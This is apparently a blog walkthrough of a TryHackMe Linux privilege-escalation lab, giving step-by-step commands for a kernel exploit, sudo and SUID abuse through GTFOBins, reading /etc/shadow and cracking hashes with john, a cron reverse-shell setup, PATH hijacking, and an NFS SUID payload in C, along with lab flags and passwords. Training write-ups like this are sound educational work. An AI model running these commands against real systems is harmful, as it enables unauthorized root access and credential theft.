---
title: "TryHackMe — Linux Privilege Escalation Walkthrough"
summary: "This room teaches **8 core Linux privilege escalation techniques** — the most important post-exploitation skill in pentesting. You start as a low-priv..."
date: "2026-03-16"
tags: ["tryhackme","walkthrough"]
---

## Overview

This room teaches **8 core Linux privilege escalation techniques** — the most important post-exploitation skill in pentesting. You start as a low-privilege user (`karen`) and learn how to reach root through different paths every time.

Techniques covered:

1. Enumeration
2. Kernel Exploits
3. Sudo misconfigurations
4. SUID binaries
5. Capabilities
6. Cron Jobs
7. PATH Variable hijacking
8. NFS misconfigurations

---

## Task 1 & 2 — Introduction

Read through the intro. Understand that **privilege escalation** means going from a normal user → root. This is almost always needed after initial access in a real pentest.

> No answers needed

---

## Task 3 — Enumeration

SSH into the machine first:

```bash
ssh karen@<MACHINE_IP>
# Password: Password1
```

### Key Enumeration Commands

**Hostname — what is the machine called?**

```bash
hostname
```

![Pasted image 20260412121650.png](/images/blog/Pasted_image_20260412121650.png)

**Kernel version — is it vulnerable?**

```bash
uname -a
cat /proc/version
```

![Pasted image 20260412121724.png](/images/blog/Pasted_image_20260412121724.png)

**OS info:**

```bash
cat /etc/issue
```

![Pasted image 20260412121809.png](/images/blog/Pasted_image_20260412121809.png)

**Python version:**

![Pasted image 20260412185636.png](/images/blog/Pasted_image_20260412185636.png)

**Find a kernel CVE:** Go to [exploit-db.com](https://www.exploit-db.com) and search `Linux 3.13.0` → CVE-2015-1328
![Pasted image 20260412122255.png](/images/blog/Pasted_image_20260412122255.png)


---

## Task 4 — Privileged Access (Concept)

This task explains the difference between:

- **Horizontal privesc** — moving from user A to user B (same level)
- **Vertical privesc** — moving from user to root (higher level)

> No answers needed

---

## Task 5 — Kernel Exploit

The kernel version `3.13.0-24-generic` is vulnerable to **CVE-2015-1328** (overlayfs exploit).

### Step 1: Find and Download the Exploit

On your attacker machine:

```bash
searchsploit linux 3.13
```

![Pasted image 20260412122804.png](/images/blog/Pasted_image_20260412122804.png)

Download exploit ID `37292` (the `.c` file, NOT the `.txt`):

```bash
searchsploit -m 37292
```

![Pasted image 20260412122856.png](/images/blog/Pasted_image_20260412122856.png)

Or download directly from ExploitDB.

### Step 2: Transfer to Target

Start a Python web server on your attacker machine:

```bash
python3 -m http.server 80
```

On the target machine:

```bash
cd /tmp
wget http://<ATTACKER_IP>:80/37292.c
```

### Step 3: Compile and Run

```bash
gcc 37292.c -o 37292
./37292
```

![Pasted image 20260412122957.png](/images/blog/Pasted_image_20260412122957.png)

You should drop into a root shell:

```bash
id
# uid=0(root)
```

![Pasted image 20260412123018.png](/images/blog/Pasted_image_20260412123018.png)
### Step 4: Get the Flag

```bash
cat /home/matt/flag1.txt
```

![Pasted image 20260412190212.png](/images/blog/Pasted_image_20260412190212.png)
![Pasted image 20260412190224.png](/images/blog/Pasted_image_20260412190224.png)
### Task 5 Answer

|Question|Answer|
|---|---|
|flag1.txt content?|_[capture from target]_|

---

## Task 6 — Sudo Privilege Escalation

### Step 1: Check Sudo Permissions

```bash
sudo -l
```

![Pasted image 20260412123822.png](/images/blog/Pasted_image_20260412123822.png)

Output shows karen can run `find`, `less`, and `nano` with sudo — without a password.

### Step 2: Exploit via GTFOBins

Head to [gtfobins.github.io](https://gtfobins.github.io) and search each binary under the **Sudo** filter.

**Escalate using `find`:**

```bash
sudo find . -exec /bin/sh \; -quit
```

![Pasted image 20260412190702.png](/images/blog/Pasted_image_20260412190702.png)

You're now root. Navigate to the flag:

```bash
cat /home/ubuntu/flag2.txt
```

![Pasted image 20260412190500.png](/images/blog/Pasted_image_20260412190500.png)
![Pasted image 20260412123945.png](/images/blog/Pasted_image_20260412123945.png)

**Answer for Nmap sudo shell (Q3):**

```bash
sudo nmap --interactive
nmap> !sh
```

**Read `/etc/shadow` using `less` (Q4 — frank's hash):**

```bash
sudo less /etc/shadow
```

Scroll through to find the hash for `frank`.

![Pasted image 20260412125217.png](/images/blog/Pasted_image_20260412125217.png)
![Pasted image 20260412190837.png](/images/blog/Pasted_image_20260412190837.png)

---

## Task 7 — SUID Privilege Escalation

### Step 1: Find All SUID Binaries

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

Compare this list against [GTFOBins](https://gtfobins.github.io) using the **SUID** filter.

**`base64`** appears on both the system and GTFOBins SUID list — exploit it.

### Step 2: Find a Comic Book Writer Username

```bash
cat /etc/passwd
```

![Pasted image 20260412125839.png](/images/blog/Pasted_image_20260412125839.png)

Look for the user `gerryconway` — that's the answer.

### Step 3: Read `/etc/shadow` via base64 SUID

```bash
/usr/bin/base64 /etc/shadow | /usr/bin/base64 -d
```

![Pasted image 20260412130423.png](/images/blog/Pasted_image_20260412130423.png)

Find user2's hash and crack it:

```bash
john --format=crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

![Pasted image 20260412191023.png](/images/blog/Pasted_image_20260412191023.png)

### Step 4: Read flag3.txt

```bash
/usr/bin/base64 /home/ubuntu/flag3.txt | /usr/bin/base64 -d
```

![Pasted image 20260412191037.png](/images/blog/Pasted_image_20260412191037.png)

---

## Task 8 — Capabilities

Capabilities let programs have specific root-like powers without being fully SUID.

### Step 1: List All Capabilities

```bash
getcap -r / 2>/dev/null
```

![Pasted image 20260412191132.png](/images/blog/Pasted_image_20260412191132.png)

### Step 2: Count Binaries with Capabilities

Count the results → **6 binaries**

### Step 3: Find the Exploitable One

Check [GTFOBins](https://gtfobins.github.io/#+capabilities) — `vim` has a capabilities exploit entry.

### Step 4: Exploit via vim Capability

```bash
./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

![Pasted image 20260412191152.png](/images/blog/Pasted_image_20260412191152.png)

Now read the flag:

```bash
cat /home/ubuntu/flag4.txt
```

![Pasted image 20260412191206.png](/images/blog/Pasted_image_20260412191206.png)

---

## Task 9 — Cron Job Privilege Escalation

Cron jobs run commands on a schedule. If root runs a script you can write to — you own root.

### Step 1: Read the Crontab

```bash
cat /etc/crontab
```

![Pasted image 20260412132946.png](/images/blog/Pasted_image_20260412132946.png)

### Step 2: Check Permissions on backup.sh

```bash
ls -la /home/karen/backup.sh
```

![Pasted image 20260412213859.png](/images/blog/Pasted_image_20260412213859.png)

Karen has **write access** to `backup.sh` — and root runs it.

### Step 3: Inject a Reverse Shell

On your attacker machine, start a listener:

```bash
nc -lvnp 1234
```

![Pasted image 20260412213920.png](/images/blog/Pasted_image_20260412213920.png)

Overwrite `backup.sh` with a reverse shell:

![Pasted image 20260412213952.png](/images/blog/Pasted_image_20260412213952.png)

![Pasted image 20260412214012.png](/images/blog/Pasted_image_20260412214012.png)

Wait up to 1 minute for cron to fire. You'll get a root shell in your netcat listener.

### Step 4: Read the Flag

```bash
cat /home/ubuntu/flag5.txt
```

![Pasted image 20260412135309.png](/images/blog/Pasted_image_20260412135309.png)

![Pasted image 20260412214105.png](/images/blog/Pasted_image_20260412214105.png)
### Step 5: Get Matt's Password Hash (Q3)

```bash
cat /etc/shadow
```

![Pasted image 20260412141146.png](/images/blog/Pasted_image_20260412141146.png)

Grab matt's hash and crack it with john:

```bash
john --format=crypt --wordlist=/usr/share/wordlists/rockyou.txt matt_hash.txt
```

![Pasted image 20260412214127.png](/images/blog/Pasted_image_20260412214127.png)

---

## Task 10 — Privilege Escalation: PATH

### Step 1: Find Writable Folders

```bash
find / -writable -type d 2>/dev/null
```

Scroll through the output — the only odd result that stands out is `/home/murdoch`.

![Pasted image 20260412221806.png](/images/blog/Pasted_image_20260412221806.png)

---

### Step 2: Add `/home/murdoch` to PATH

```bash
export PATH=/home/murdoch:$PATH
echo $PATH
```

![Pasted image 20260412222248.png](/images/blog/Pasted_image_20260412222248.png)

Now Linux will search `/home/murdoch` **first** when looking for any command.

---

### Step 3: Create a Fake `thm` Binary

```bash
echo '/bin/bash' > /home/murdoch/thm
chmod +x /home/murdoch/thm
```
![Pasted image 20260412222103.png](/images/blog/Pasted_image_20260412222103.png)
![Pasted image 20260412222115.png](/images/blog/Pasted_image_20260412222115.png)

We've created a file called `thm` that spawns a bash shell. Since the SUID `test` binary will run it as root, we'll get a root shell.

---

### Step 4: Run the SUID Binary

```bash
/home/murdoch/test
```

![Pasted image 20260412221936.png](/images/blog/Pasted_image_20260412221936.png)

The binary looks for `thm` → finds our fake one in `/home/murdoch` → runs it as root.

```bash
id
# uid=0(root)
```

![Pasted image 20260412221946.png](/images/blog/Pasted_image_20260412221946.png)

**Root shell obtained.**

---

### Step 7: Read flag6.txt

```bash
cat /home/matt/flag6.txt
```

![Pasted image 20260412222045.png](/images/blog/Pasted_image_20260412222045.png)

> **Flag 6: `THM-736628929`**

---

## Task 11 — NFS Privilege Escalation

### What is `no_root_squash`?

Normally, NFS maps root-created files to `nobody` for safety (root squashing). When `no_root_squash` is set, **files created by root on a mounted share keep their root ownership**. We abuse this to plant an SUID binary.

### Step 1: Check NFS Exports on Target

```bash
cat /etc/exports
```

3 shares with `no_root_squash` → all exploitable.

### Step 2: Mount the Share on Attacker Machine

```bash
# On your attacker machine (as root)
sudo su
mkdir /tmp/tryhackme
mount -o rw,vers=2 <MACHINE_IP>:/tmp /tmp/tryhackme
```

![Pasted image 20260412214540.png](/images/blog/Pasted_image_20260412214540.png)

### Step 3: Create a SUID Shell Payload

Still as root on your attacker machine:

```c
// exploit.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash");
    return 0;
}
```

![Pasted image 20260412214603.png](/images/blog/Pasted_image_20260412214603.png)

```bash
# Save, compile, and set SUID on the mounted share
gcc -static exploit.c -o exploit -w
chmod +sexploit
```

![Pasted image 20260412214619.png](/images/blog/Pasted_image_20260412214619.png)
![Pasted image 20260412214630.png](/images/blog/Pasted_image_20260412214630.png)
![Pasted image 20260412214641.png](/images/blog/Pasted_image_20260412214641.png)
### Step 4: Execute on Target

Back on the target machine:

```bash
/tmp/exploit
# You're root
cat /home/ubuntu/flag7.txt
```
![Pasted image 20260412214707.png](/images/blog/Pasted_image_20260412214707.png)

![Pasted image 20260412214716.png](/images/blog/Pasted_image_20260412214716.png)

![Pasted image 20260412214728.png](/images/blog/Pasted_image_20260412214728.png)

---
## Task 12 — Capstone Challenge Walkthrough

### Step 1: Check Sudo — Dead End

```bash
sudo -l
```

![Pasted image 20260412215644.png](/images/blog/Pasted_image_20260412215644.png)

`leonard` has no sudo rights at all. Cross that off the list.

---

### Step 2: Enumerate Home Directories

```bash
ls -l /home/missy      
ls -l /home/rootflag
ls -l /home/leonard
```

![Pasted image 20260412215659.png](/images/blog/Pasted_image_20260412215659.png)

![Pasted image 20260412215712.png](/images/blog/Pasted_image_20260412215712.png)

![Pasted image 20260412215721.png](/images/blog/Pasted_image_20260412215721.png)

Can't read either flag directly. Need to escalate first.

---

### Step 3: Check Cron Jobs

```bash
cat /etc/crontab
```

![Pasted image 20260412215750.png](/images/blog/Pasted_image_20260412215750.png)

No user-defined cron jobs. Dead end.

---

### Step 4: Find SUID Binaries

```bash
find / -perm -u=s 2>/dev/null
```

![Pasted image 20260412215802.png](/images/blog/Pasted_image_20260412215802.png)

Scanning the list — `/usr/bin/base64` stands out. It's SUID and on GTFOBins. This is the path.

---

### Step 5: Read `/etc/shadow` via base64 SUID

```bash
/usr/bin/base64 /etc/shadow | /usr/bin/base64 -d
```

This reads the shadow file as root. Copy **missy's hash** from the output.

---

### Step 6: Crack Root and Missy's Hash

Save the hash on your **attacker machine**:

```bash
nano missy.txt
```

![Pasted image 20260412220002.png](/images/blog/Pasted_image_20260412220002.png)

Crack it with John:

```bash
sudo john --wordlist=/usr/share/wordlists/rockyou.txt missy.txt
```


![Pasted image 20260412220032.png](/images/blog/Pasted_image_20260412220032.png)

Result → **`Password1`**

---

**Root's Hash:**

Save root's hash separately:

```bash
nano root_hash.txt
```

![Pasted image 20260412220645.png](/images/blog/Pasted_image_20260412220645.png)

Crack it with John:

```bash
sudo john --wordlist=/usr/share/wordlists/rockyou.txt root_hash.txt
```

![Pasted image 20260412220706.png](/images/blog/Pasted_image_20260412220706.png)

taking too long to crack.

---

### Step 7: Switch to Missy

```bash
su missy
# Password: Password1
```

---

### Step 8: Get Flag 1

```bash
cd /home/missy/Documents
cat flag1.txt
```

![Pasted image 20260412220826.png](/images/blog/Pasted_image_20260412220826.png)

![Pasted image 20260412220851.png](/images/blog/Pasted_image_20260412220851.png)

> **Flag 1: `THM-42828719920544`** 

---

### Step 9: Get Flag 2 (root flag)

As missy, check sudo:

```bash
sudo -l
# missy can run: /usr/bin/find
```

![Pasted image 20260412220911.png](/images/blog/Pasted_image_20260412220911.png)

Exploit via GTFOBins:

```bash
sudo find . -exec /bin/sh \; -quit
cat /home/rootflag/flag2.txt
```

![Pasted image 20260412220927.png](/images/blog/Pasted_image_20260412220927.png)

![Pasted image 20260412220938.png](/images/blog/Pasted_image_20260412220938.png)

> **Flag 2:** _[capture from `/home/rootflag/flag2.txt`]_ 

---

## Key Takeaways

**1. Always enumerate first.** Kernel version, OS, users, sudo rights, SUID files, cron jobs, NFS exports — gather everything before exploiting anything.

**2. GTFOBins is your bible.** Any time you see a sudo permission or SUID binary, check GTFOBins immediately. It covers hundreds of binaries with ready-to-use privesc commands.

**3. Writable root-owned cron scripts = guaranteed root.** If root runs a script and you can write to it — inject a reverse shell and wait.

**4. `no_root_squash` on NFS = plant your own SUID binary.** Mount the share as root on your machine, drop a SUID shell, execute it on target.
